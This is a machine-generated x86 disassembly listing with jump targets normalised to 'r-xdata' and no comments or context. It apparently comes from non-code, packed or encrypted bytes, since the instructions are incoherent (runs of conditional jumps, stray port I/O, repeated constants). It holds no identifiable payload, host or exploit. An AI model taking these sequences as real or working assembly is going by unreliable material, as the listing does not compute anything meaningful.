loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
add esp edi
imul ebx [ ebx ] 0x2de1e00d
sbb eax 0x232c691d
push ds
shl ebx 0x1
loop r-xdata
fidiv [ ecx - 0x4a4bdd2f ]
xchg dh al
or dh [ esp + ecx + 0x1d ]
sbb eax 0x61ee2661
push ds
jb r-xdata
pop ds
sbb eax 0xc9280a1d
mov ecx 0x6972212b
cmpsd [ esi ] [ edi ]
sbb ah cl
scasd [ edi ]
push ds
mov dl 0xb
retn 0xac0b
jb r-xdata
in eax 0xb2
test [ ecx - 0x5b ] ch
cwde
pop ebp
lahf
adc [ ebx + ebp * 2 + 0x560bdcb7 ] al
sbb eax 0xeba167ed
sbb eax 0x1a6186b4
sbb eax 0xe2e24e74
jb r-xdata
0xe2e2
cmpsd [ esi ] [ edi ]
mov [ edx + 0x10a76b84 ] dl
mov edx 0x6b84cc88
or dl cl
and cl [ ebx ]
pop edi
test [ ebx - 0x59 ] ch
jecxz r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
movsd [ edi ] [ esi ]
sbb eax 0x26676f1d
mov dl 0xb
neg [ esi ]
sbb eax 0xd5880ab2
loop r-xdata
jb r-xdata
outsd
sbb eax 0x3d0bf288
jb r-xdata
imul esp [ edi - 0x337745f0 ] 0xffffff84
imul esp [ edi - 0x11c0f4ea ] 0xffffffe2
loop r-xdata
ja r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
mov ch 0x6b
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x676fb21d
pop esi
sbb [ 0xffffffffcd0ab21d ] bl
or al 0x1d
sbb eax 0xbc22661
mov [ 0x26676fb2 ] al
push ds
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x6f
cmpsd [ esi ] [ edi ]
bound esi [ edx - 0x19774e4f ]
jb r-xdata
or edi [ 0x63e2e2c4 ]
jb r-xdata
loop r-xdata
pop esi
sbb [ 0xffffffffa76fb21d ] bl
xor dh [ edx - 0xc75f44f ]
loop r-xdata
mov cl 0xb1
mov cl 0x6f
inc edi
jmp r-xdata
push cs
popad
push cs
push ebp
or edi [ 0x72e2e2d7 ]
in eax dx
jb r-xdata
jb r-xdata
push cs
and [ ebx ] ecx
or edx esp
loop r-xdata
mov dl 0x80
cmp ebp ebp
jb r-xdata
loop r-xdata
push cs
cmp eax 0x63e2e2c4
jb r-xdata
jb r-xdata
or eax 0x72e2e2a0
sub eax 0xe1d85ced
adc ah [ ebx - 0x24 ]
mov dl 0xa7
and ch ch
sbb eax 0xa769f697
jb r-xdata
loop r-xdata
shl [ edx ] 0x1
mov ebp 0xe2c72b0b
mov esi 0xe2a62f0b
loop r-xdata
loop r-xdata
0xb21d1d1f 0x1db1
mov ch 0xb2
or edx [ ecx - 0x12 ]
out 0xb1 al
mov cl 0xb1
outsd
popad
xchg [ esi ] ebx
loop r-xdata
jb r-xdata
test cl ah
cmpsb [ esi ] [ edi ]
mov dh 0xed
push ebp
and dh [ edx + 0x490b2469 ]
push cs
sbb eax 0x1db0721d
xchg esi eax
mov ah 0xd1
cmp [ ebp + 0x676f1a69 ] esi
loop r-xdata
jb r-xdata
mov edx 0x6b849288
cmpsd [ esi ] [ edi ]
cmp al 0xb
loope r-xdata
or esp ebp
imul edi [ edi + 0x16971d36 ] 0xb
dec esp
shl [ edx ] 0x1
sub esp [ ecx ]
enter 0xe2e2 0x72
jb r-xdata
mov ah dl
loop r-xdata
sbb eax 0xbf2bfda
loop r-xdata
loop r-xdata
outsd
0xa1d1d1f 0xc928
sbb ch [ ebx - 0x59 ]
jb r-xdata
mov dl [ ebx ]
sbb eax 0x7272721d
jb r-xdata
add ah ah
loop r-xdata
test [ ebx - 0x59 ] ch
cmp [ ebx ] cl
xor cl al
loop r-xdata
cmpsd [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
outsd
xchg [ di ] bl
cli
loope r-xdata
arpl [ esi ] cx
jb r-xdata
loop r-xdata
sbb eax 0xe2d2e28a
loop r-xdata
imul esp [ edx + ecx ] 0x1d1d1bb9
popad
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb [ 0x7272721d ] ebx
jb r-xdata
sbb eax 0x4c0b1697
jb r-xdata
loop r-xdata
outsd
cmpsd [ esi ] [ edi ]
cmp dh [ edx + 0x6b3e971d ]
mov edi 0xce3e0b3a
loop r-xdata
mov bh 0x69
push cs
popad
push cs
mov edx 0xb422d1b1
mov ch 0x6b
cmpsd [ esi ] [ edi ]
push ds
imul esp [ edi + 0x16a76b1a ] 0xb

sbb eax 0x72721d1d
loop r-xdata
push ss
or ecx ebx
loope r-xdata
imul esp [ edi + 0x1aa76b1e ] 0x6b
cmpsd [ esi ] [ edi ]
jbe r-xdata
out dx al
or ebx edi
in al 0xe2
loop r-xdata
or ebp [ ecx + 0x6be2e2e2 ]
jb r-xdata
mov bh ah

mov dl dl
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jecxz r-xdata
mov ch 0xb
pushad
cld
sbb ebx [ 0x7272721d ]
popad
loop r-xdata
jb r-xdata
or ecx [ ecx + ebx + 0x1d ]
sbb eax 0x72727272
jb r-xdata
xchg edi eax
push ss
imul esp [ edi + 0x6f39d10f ] 0xffffffa7
jb r-xdata
mov cl 0xb4
loop r-xdata
fidivr [ edi - 0x53bf40e ]
jb r-xdata
sbb eax 0xe2e25a74
mov dh ah
outsd
cmpsd [ esi ] [ edi ]
push ds
mov dl 0xb
mov ecx 0x88e2e2f6
imul esp [ esi + 0x66edf6c6 ] 0xffffffdf
loop r-xdata
in eax dx
adc [ edx + 0x2a69e2e2 ] ah
or esi ebx
sbb eax 0x72721d1d
cmpsb [ esi ] [ edi ]
jb r-xdata
imul esp [ edi - 0x1e34f4ea ] 0xffffffe2
imul esp [ esi + esi * 2 - 0x1e ] 0xffffffe2
loop r-xdata
mov edi 0x16971d36
jb r-xdata
jb r-xdata
xor [ ebp - 0x1db99b95 ] 0xe2
jb r-xdata
inc edx
mov [ 0xffffffff9269e2e2 ] al
fsubrp st1
sub al 0xe7
loop r-xdata
and ch ch
loop r-xdata
into
loopne r-xdata
jb r-xdata
out dx al
imul esp [ esi + 0x2267f2c6 ] 0xffffffed
mov ecx 0x611d1d1b
outsd
or bh [ ecx + 0x611d1d1b ]
jb r-xdata
in eax 0x1b
jb r-xdata
mov cx fs
loop r-xdata
and ch ch
jb r-xdata
mov cl 0xb1
mov cl 0x6f
sbb eax 0xab2b41d
cdq
nop [ 0x3d0bf288 ] ebx
mov [ esi + 0x1d86676f ] ah
sbb eax 0x72727272
jb r-xdata
xor [ bp + di ] cl
dec ebx
adc [ 0x7272721d ] ebx
and ch ch
loop r-xdata
push es
stc
or dl [ ecx ]
in al 0xe2
loop r-xdata
jb r-xdata
imul esp [ esi + eax * 2 - 0x1e ] 0xffffffe2
adc esp esp
loop r-xdata
sbb eax 0x4c0b1697
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6d7745c2 ] 0xffffff84
imul esp [ edi - 0x91ef4c4 ] 0xffffffe2
loop r-xdata
jb r-xdata
je r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
loop r-xdata
0x1df2971d 0xee97
xchg edi eax
jb r-xdata
fldenv [ ecx ]
or ecx [ ecx ]
loop r-xdata
imul edi [ edx ] 0x4bf6b84
sar [ ecx ] 0x1
scasd [ edi ]
or edi [ ecx + 0x10 ]
sbb eax 0x7272721d
jb r-xdata
imul [ ecx - 0x59 ]
test [ ecx + 0x1b ] ah
loop r-xdata
push ecx
out dx al
mov ch 0x6b
stc
fnclex
loop r-xdata
mov dl 0x80
mov bh cl
loop r-xdata
push ds
mov dl 0xb1
or eax [ eax + 0x721d1d0d ]
cmpsd [ esi ] [ edi ]
psrlw mm7 [ ecx ]
outsd
cmpsd [ esi ] [ edi ]
sar [ ecx ] 0x1
jb r-xdata
imul ebx [ ebx + ecx ] 0xe2e2e086
in eax dx
out 0xe2 al
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
and di sp
loop r-xdata
outsd
pop ds
sbb eax 0xbb2b11d
or ecx edi
jb r-xdata
or edx [ ecx + edx ]
sub al 0x69
loop r-xdata
cmp eax 0x200b1931
loop r-xdata
and ah [ edx + 0x7272212b ]
inc esi
loop r-xdata
mov ch 0x69
sbb ch [ edi + 0x67 ]
or bl [ ebx + 0x61e2e2c6 ]
sbb ah bl
in eax dx
aam 0x10
sbb eax 0xdb1dd11d
sahf
loop r-xdata
pop ebp

mov ecx 0x10bf6b84
or edx [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
or [ edx ] edx
sbb eax 0xd2e28a1d
loop r-xdata
jb r-xdata
loop r-xdata
and bh [ ebp - 0x1d1978f5 ]
jb r-xdata
xchg al ah
loop r-xdata
loop r-xdata
mov dl 0xb5
or esp [ eax - 0x4 ]
imul edi [ ebx ] 0xcbf6b84
mov ecx 0x12bf6b84
imul ecx [ esi ] 0xe2f3cb0b
loop r-xdata
or al 0x1d
jb r-xdata
iretd
jb r-xdata
pop ds
sbb eax 0xf2bfda1d
or eax esp
cli
push cs
loop r-xdata
and bh [ ebp - 0x1d38d4f5 ]
sahf
mov dh 0xe2
0xbe2e2e0 0xb7c
shl [ edx ] 0x1
mov ebp 0xe2e6870b
sbb al [ ebx + ebp * 2 + 0x1c69249f ]
or eax [ esi + 0x72e2e2e0 ]
mov ch 0x5d
jb r-xdata
jb r-xdata
or eax [ edi + 0x72e2e2e6 ]
or ecx [ edx + 0x721d1d18 ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata

popad
jb r-xdata
aas
pop ecx
jb r-xdata
jb r-xdata
jb r-xdata
push cs
mov bh 0x69
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
adc al 0x11
jb r-xdata
loopne r-xdata
jb r-xdata
imul edi [ edi + 0x6e0ab516 ] 0xffffffd1
loop r-xdata
loop r-xdata
loop r-xdata
bound ebx [ edi + 0x67ede0f2 ]
and ah [ eax - 0x72771d1e ]
sbb eax 0xbf6b0e97
push ss
mov ch 0xa
outsb
jb r-xdata
jb r-xdata
loop r-xdata
or ebx [ ecx - 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
lahf
loopne r-xdata
jb r-xdata
jb r-xdata
jbe r-xdata
jb r-xdata
xor [ ebp - 0x1dc9a395 ] 0xe2
loop r-xdata
xor [ eax ] cl
sbb eax 0x8a1a691d
0xe2d83d0b 0x72e2
imul esp [ edx + edi - 0x1e ] 0xffffffe2
das
or [ 0xffffffff8a1a691d ] bl
jb r-xdata
jb r-xdata
mov edx 0x6b848088
mov [ 0xbea971d ] al
cmp eax 0x72e2e2d8
jb r-xdata
jb r-xdata
sub ah dl
loop r-xdata
xchg edi eax
jb r-xdata
jb r-xdata
aam 0xe2
loop r-xdata
and ah [ bx + si - 0x1d1e ]
loopne r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
jb r-xdata
pop esp
or dh [ eax ]
pop eax
xor [ ebp - 0x1dc9a395 ] 0xe2
sbb eax 0x2f8a1a69
jb r-xdata
push cs
adc [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl edx 0x1
mov edi 0x6e0ab516
jb r-xdata
jb r-xdata
mov [ ebp + 0xb9288ba ] cl
scasd [ edi ]
jb r-xdata
jb r-xdata
mov ebx 0x6b849a88
scasd [ edi ]
xor al 0xbb
mov [ ebx + 0x3aaf6b84 ] al
mov ebx 0x6b848588
scasd [ edi ]
sbb eax 0xf66aeeaf
jecxz r-xdata
sbb cl [ edx - 0x7d0ca7d1 ]
mov ch 0x6b
pop esp
loop r-xdata
jb r-xdata
loop r-xdata
xchg [ ecx - 0x1d23a3f5 ] esi
jb r-xdata
sbb eax 0xb3aaa96f
imul ebp [ ecx + 0x12e90aba ] 0xbbb1d1d
pop ecx
rcr [ 0xffffffffe088b5b5 ] 0x1
cmp ah dl
loop r-xdata
sub esp [ ecx ]
jb r-xdata
loop r-xdata
pop esi
sbb [ 0xffffffffcf0bb21d ] bl
or ecx ebx
loop r-xdata
jb r-xdata
mov edx 0xaf0b9288
mov al [ 0xffffffff8d88e2e2 ]
jb r-xdata
test [ ebx - 0x41 ] ch
or ch [ ecx + 0x38 ]
test [ ebx - 0x41 ] ch
push cs
cmp al [ ebx + ebp * 2 + 0x39d104bf ]
jb r-xdata
test [ edi + 0x30 ] ah
or ecx [ ebx + 0x11 ]
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
jb r-xdata
test eax 0xa969b3aa
mov edx 0x1d12e90a
sbb eax 0x19590bbb
vpsrad ymm4 ymm5 xmm2
in eax dx
jmp r-xdata
loop r-xdata
jb r-xdata
or ebx [ esp + ebx * 8 - 0x1e ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
or [ 0x2a646b1d ] bl
loop r-xdata
or bh [ edi ]
pop ebx
scasd [ edi ]
sbb eax 0x3d0bea97
fsub st2
loop r-xdata
sbb eax 0xccf0bb2
and al ah
or esi [ esi - 0x19 ]
loop r-xdata
jb r-xdata
int 0xe1
loop r-xdata
mov al [ edi + 0x5b ]
jb r-xdata
sbb [ 0x7272721d ] ebx
sbb eax 0x590bbb1d
push ss
sbb eax 0xebf60b1d
imul ecx [ esi ] 0xb1820e61
mov ah 0xb
mov ebx 0x721d1d11
jb r-xdata
mov [ edi - 0x40947b47 ] dl
adc [ ebx ] cl
mov ch 0x88
loopne r-xdata
imul esp [ edi - 0x7f7745fe ] 0xffffff84
imul esp [ edi - 0x7c774600 ] 0xb
0x72e2e2f9 0xd172
sbb eax 0xe088b5b5
jb r-xdata
test [ ebx - 0x61 ] ch
mov eax 0xb4b1e2e2
test bl bl
0x1d1f610b 0x721d
mov [ 0xffffffffaf5b212b ] al
push ss
jb r-xdata
cmpsd [ esi ] [ edi ]
add [ edx - 0x65f47c78 ] bh
stc
loop r-xdata
add bh [ edx + 0x6b848088 ]
jb r-xdata
jb r-xdata
jb r-xdata
lea edi [ edx - 0x50f46d78 ]
shl dl cl
loop r-xdata
mov cl [ edi ]
shl ah 0x1
or al 0xb1
imul esp [ edx + ebx - 0x1e ] 0xffffffe2
loop r-xdata
test [ ebx ] 0xa31b
pop ebx
jb r-xdata
fsubr st2
adc [ esi + 0x5c0bb187 ] edx
jb r-xdata
mov [ edi + 0x2ca76b84 ] dl
jb r-xdata
jb r-xdata
push ss
jb r-xdata
jb r-xdata
jb r-xdata
in al 0xc
mov cl 0x6b
sbb ah dl
loop r-xdata
xchg esp eax
mov dl 0xb
xchg ebx eax
loop r-xdata
cld
test [ ebx ] 0xe2e2a31b
jb r-xdata
sbb eax 0xc4950b1d
loop r-xdata
mov dl ah
xor [ edx - 0x77443378 ] bh
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ ebx - 0x51 ] ebx
sbb eax 0x7272721d
mov bh 0x7a
test [ ebx - 0x61 ] ch
jbe r-xdata
imul ebx [ edi - 0x7be22ed6 ] 0x6b
and cl [ ebx ]
jmp 0x73288283
loope r-xdata
or bh ah
or cl ch
loope r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb esp [ ebx + 0x7272e2e2 ]
jb r-xdata
adc cl cl
adc esp [ ecx + 0x23 ]
loopne r-xdata
jb r-xdata
fwait
imul edi [ edi - 0x451edae6 ] 0xffffffbb
mov ebx 0x33d984bb
in eax dx
sub al 0x84
cmpsd [ esi ] [ edi ]
jb r-xdata
and [ ebx + ebp * 2 - 0x7745cf59 ] al
jb r-xdata
out 0xe2 al
loop r-xdata
imul ebx [ edi - 0x5f7742d8 ] 0xffffff84
loop r-xdata
or ecx ebx
and al 0xb
jb r-xdata
jb r-xdata
outsd
loop r-xdata
loop r-xdata
jb r-xdata
inc edi
loop r-xdata
jb r-xdata
jpe r-xdata
cli
imul esp [ esi + edx - 0x1e ] 0xffffffe2
loop r-xdata
and cl [ ebx ]
push ebp
test [ ebx - 0xa ] ch
in al dx
pushfd
jb r-xdata
jb r-xdata
sbb eax 0xf7990b1d
loop r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
imul esp [ edi - 0x337745d0 ] 0xffffffbb
jb r-xdata
mov ebx 0x6b849588
or ecx [ edx + 0x72e2e2c0 ]
push eax
jb r-xdata
jb r-xdata
sub dl cl
sbb eax 0x289f6b84
mov ebp 0x6b84a088
loop r-xdata
cmp [ ebx ] cl
mov eax [ 0x72e2e2ec ]
jb r-xdata
0x34af6b84 0x88bb
add [ ebx + ebp * 2 - 0x7744c551 ] 0xffffff85
test [ ebx - 0x51 ] ch
jb r-xdata
lahf
sub [ ebp + 0x6b84a088 ] bh
mov [ 0xffffffffe2c08a0b ] al
loop r-xdata
nop
or ecx [ edi ]
push ds
loop r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cli
or edx [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x1d1d5be6
jb r-xdata
xor ch [ ecx + 0x20 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
scasd [ edi ]
xor [ ebx + 0x6b849688 ] bh
scasd [ edi ]
test [ ebx - 0x59 ] ch
xor al 0x69
and [ ebx ] ecx
mov ebx [ esi ]
sbb eax 0x6b84721d
scasd [ edi ]
xor bh [ ebx + 0x6b849588 ]
sbb eax 0x8872721d
jb r-xdata
or edx [ esi ]
0xe2e2
sbb eax 0x930bb294
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edx + 0x12 ]
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x30a76b84
jb r-xdata
imul esp [ ss : ebx + ecx ] 0x1d1d1c50
mov ah cl
jb r-xdata
loop r-xdata

jb r-xdata
jb r-xdata
jne r-xdata
out 0x5b al
jb r-xdata
sbb eax 0xbf6be2e2
jb r-xdata
imul esi [ edi - 0x60947b86 ] 0x76
jb r-xdata
mul edx
mov ebp 0x360bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x69
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or eax [ esp + ebx * 8 - 0x1e ]
loop r-xdata
sbb eax 0xe2f7990b
imul esp [ edi - 0x4bf445c6 ] 0x19
sbb eax 0x7272721d
popad
jb r-xdata
out dx al
jb r-xdata
imul ebp [ edx + 0x52 ] 0xffffffe2
loop r-xdata
jb r-xdata
loop r-xdata
mov bl [ ebx - 0x4a89de34 ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6be2e21d
cmpsd [ esi ] [ edi ]
test [ ebx - 0x59 ] ch
jb r-xdata
mov ebx 0x6b849b88
jb r-xdata
jb r-xdata
or ebx [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
push ss
in al dx
loop r-xdata
mov ecx 0x1d1b360b
sbb eax 0xc2c6a66b
and cl [ bp + di ]
mov edx 0x6b848f88
cmpsd [ esi ] [ edi ]
mov edx 0x88b88d88
jb r-xdata
jb r-xdata
mov es si
outsb
or eax [ ebx ]
xlat
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
shl dl cl
loop r-xdata
0xe2c1
or cl [ esi - 0x5 ]
jb r-xdata
cmp eax 0x721d1d04
imul esp [ edx + ebx * 8 - 0x1d1c82f6 ] 0xffffffe2
loop r-xdata
imul ebx [ edx ] 0xe2e3dd0b
jb r-xdata
jb r-xdata
jb r-xdata
sbb ah cl
sbb ebp ebp
jb r-xdata
loop r-xdata
jb r-xdata
or ecx [ ebp + 0x72e2e2d7 ]
jb r-xdata
or dh [ ebx - 0x1d ]
sbb eax 0x751d0a97
loop r-xdata
or ah dl
jb r-xdata
push cs
jb r-xdata
jb r-xdata
imul esp [ edi + 0x2bb9bd1a ] 0x72727221
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x7272e2e2 ] eax
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbae1251a
mov ebx 0xd984bbbb
xor ebp ebp
jb r-xdata
pop ebx
loop r-xdata
imul esp [ edi - 0x23bbf4e2 ] 0xffffffe2
test [ ebx - 0x59 ] ch
cmp bh [ edx + 0x1d19b40b ]
sbb eax 0x72727272
loope r-xdata
jb r-xdata
sbb eax 0x7272721d
pop ds
sbb eax 0xf17a0a1d
loop r-xdata
jb r-xdata
fisubr [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esp [ esi + 0x2267c2c6 ] 0xb
loop r-xdata
pop edx
and ah dl
jb r-xdata
insb
jb r-xdata
sub esp [ ecx ]
jb r-xdata
xchg esi eax
jne r-xdata
jb r-xdata
neg [ 0x1e751dd4 ]
and cl [ ebx ]
jb r-xdata
jb r-xdata
cli
popad
sahf
shl al 0x5d
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx - 0xf3ef43e ] 0x7272e2e2
or ecx [ esi ]
mov dl [ ebx - 0x16 ]
out 0x15 al
mov ch 0x6b
movsb [ edi ] [ esi ]
mov [ 0xffffffffe2d19c0b ] al
loop r-xdata
inc esp
fsubr st2
or bl ch
jecxz r-xdata
sbb ebx [ 0xffffffffc6a66b1d ]
or esi [ esi ]
loop r-xdata
or esp [ ecx ]
mov dl 0xb
jb r-xdata
push 0x52
loop r-xdata
sub eax 0xbe2e2e7
jb r-xdata
sbb bh [ ebp + 0x72212bb9 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
or ecx edx
shl edx 0xe2
jb r-xdata
jb r-xdata
mov edx 0x88bbcc88
jb r-xdata
sbb al 0x1d
imul esp [ edi + 0xb246936 ] 0x50
jb r-xdata
or eax 0x6f721d1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ebx 0xed33d984
and eax 0xbbbbbae1
test [ ebx - 0x59 ] ch
adc al 0x88
xchg edi eax
mov [ edi + 0x2ea76b84 ] cl
mov edx 0x88b88d88
0xe2e2de0b 0x72e2
loop r-xdata
jb r-xdata
retn 0x2d0b
jb r-xdata
les eax [ ecx + 0x6bb17588 ]
jb r-xdata
loop r-xdata
jb r-xdata
or edi [ ebx + ecx ]
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x225a691d
push es
jb r-xdata
inc edi
mov dl al
jb r-xdata
sbb eax 0x54ed96b4
loop r-xdata
jb r-xdata
and esp ebx
loop r-xdata
loop r-xdata
arpl [ eax ] dx
sbb eax 0xa769deb4
jb r-xdata
sbb eax 0x6bb1b21d
push edi
xor bl [ edi ]
sbb eax 0xe0950b1d
loop r-xdata
adc bl [ 0x2b67841d ]
or ebx [ eax + eax * 8 + 0x676fe2e2 ]
xor bl [ edi ]
jb r-xdata
push 0x1d12e10b
sbb eax 0xb2b6784
pushfd
shl dl 0xe2
pop ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
and cl [ ebx ]
pop esi
fnclex
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
imul ecx [ esi ] 0xbee0e61
fimul [ edx ]
jae r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
mov ebp 0x72212bb9
sbb eax 0xe2e27e72
mov ah 0xde
jb r-xdata
mov [ ebp - 0x4f ] dh
jb r-xdata
retn 0x2267
sbb eax 0xc6a66b1d
dec esi
sti
int3
jb r-xdata
sbb eax 0xe6bc6f72
jb r-xdata
mov eax 0x6b849788
jb r-xdata
sbb ah [ 0xffffffffbbbbbae1 ]
jb r-xdata
loop r-xdata
mov esp 0x1b360bb9
jb r-xdata
jne r-xdata
jb r-xdata
shl dl cl
mov cl 0xb
push cs
movsd [ edi ] [ esi ]
in eax dx
jb r-xdata
loop r-xdata
or ecx [ eax ]
jb r-xdata
xchg esi eax
jb r-xdata
sbb ebx [ 0x7272721d ]
sbb eax 0xfac30a1d
loop r-xdata
cmp al 0xb
loop r-xdata
sbb eax 0xe2225a69
or ebp [ 0xbe2e2e7 ]
jb r-xdata
jb r-xdata
jb r-xdata
aam 0x1d
jne r-xdata
mov eax [ 0x226784fe ]
in eax dx
mov dx 0xe2ec
loop r-xdata
push ebp
loop r-xdata
and [ ebx ] ecx
jb r-xdata
mov al 0xd0
sbb al 0x84
imul ebx [ edi - 0x3a05f4e8 ] 0xffffffe2
loop r-xdata
mov dl 0xb3
mov bl ah
loopne r-xdata
jb r-xdata
jb r-xdata
fucom st3
loop r-xdata
and cl [ bp + di ]
jb r-xdata
retn 0x646b
or esi [ ecx + ebx + 0x72721d1d ]
mov ah dl
loop r-xdata
loop r-xdata
xchg edi eax
or bl [ 0xffffffffe2e26675 ]
jle r-xdata
scasd [ edi ]
jb r-xdata
mov cl 0xb
jno r-xdata
or eax [ edi - 0x1a ]
push esp
loop r-xdata
mov ah 0x69
push edx
pop esi
sbb al 0xd4
loop r-xdata
mov al ah
or [ eax + 0x646bb175 ] 0xe2e2e20a
loop r-xdata
fucom st3
loop r-xdata
mov cl 0x6b
mov [ ebx + 0x36a76b84 ] bl
jb r-xdata
outsd
jb r-xdata
push ss
sbb eax 0x1a6f6f1d
imul esp [ edi + 0xb908814 ] 0xf
push ebx
0x6bb515e6 0xa2a4
loop r-xdata
jb r-xdata
imul esp [ esi + ebx * 8 - 0x1d1c8cf6 ] 0xffffffe2
imul esp [ edx + ecx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and cl [ ebx ]
mov cl 0xff
loop r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
jb r-xdata
int1
jb r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xd0b066ed
je r-xdata
or ah [ edi ]
jb r-xdata
scasd [ edi ]
jb r-xdata
adc ah [ edi + 0x14 ]
in eax dx
sub [ esi ] dx
sbb eax 0xf2a7691d
imul edi edx 0xffffffb1
mov ah 0xb
mov ah 0xb
sbb eax 0x1d67721d
mov al al
loop r-xdata
jb r-xdata
jb r-xdata
imul ebx [ esp + eax * 4 ] 0xb189f6b
cli
mov bl 0x88
jecxz r-xdata
jb r-xdata
or esp [ ebx + 0x10 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
outsd
jb r-xdata
loop r-xdata
sbb eax 0xb772721d
or edi esi
pop ss
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb77272
jb r-xdata
jecxz r-xdata
loop r-xdata
popad
test [ ebx - 0x59 ] ch
jb r-xdata
imul esp [ edi - 0x58947bd4 ] 0x32
jb r-xdata
or eax [ ecx + 0x721d1d1e ]
mov bl 0xa
jpo r-xdata
imul ah
mov cl 0x1d
xchg esi eax
loop r-xdata
jb r-xdata
loop r-xdata
or ah dl
jb r-xdata
cmp [ esi ] eax
cmp [ ebp + 0x6ced1467 ] esi
adc ah dl
loop r-xdata
jb r-xdata
out 0x1d al
cmpsb [ esi ] [ edi ]
mov cl 0xb4
imul edx [ edx + 0x5e ] 0xd1e2e2e2
jb r-xdata
mov edx 0x69e2e2ec
mov ah 0x96
loop r-xdata
loop r-xdata
add dh ah
loop r-xdata
shl dl 0xe2
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
mov al 0xd0
or ebx [ 0x1d67721d ]
outsd
xor bl [ bx ]
imul esp ebx 0xffffffb1
or esi [ ecx + 0x1d ]
jb r-xdata
jb r-xdata
shl eax 0xe2
loop r-xdata
push ds
jb r-xdata
sbb [ 0xffffffffa66bbb1d ] bl
nop
jb r-xdata
inc esi
jb r-xdata
outsd
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
or edi [ 0x721d1d04 ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
pushad
adc eax 0x55ed1d1d
jb r-xdata
jb r-xdata
and ch ch
out 0xe2 al
loop r-xdata
loop r-xdata
imul esp [ esi + ebx * 4 + 0x1d1cfa0a ] 0x1d
mov ch [ ebp - 0x4a1063e7 ]
imul esp [ esi + ecx * 8 + 0x1d1ce80a ] 0x1d
mov al [ edx ]
ffreep st3
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fwait
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0x1df6c696
aam 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
mov [ 0x1d14130b ] al
sbb eax 0x2361b172
adc cl [ edx ]
imul ecx [ eax ] 0xa1691d1d
salc
stosb [ edi ]
loopne r-xdata
jb r-xdata
outsd
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d1c50
jb r-xdata
imul esp [ edi - 0x7bdf96ce ] 0x6b
jb r-xdata
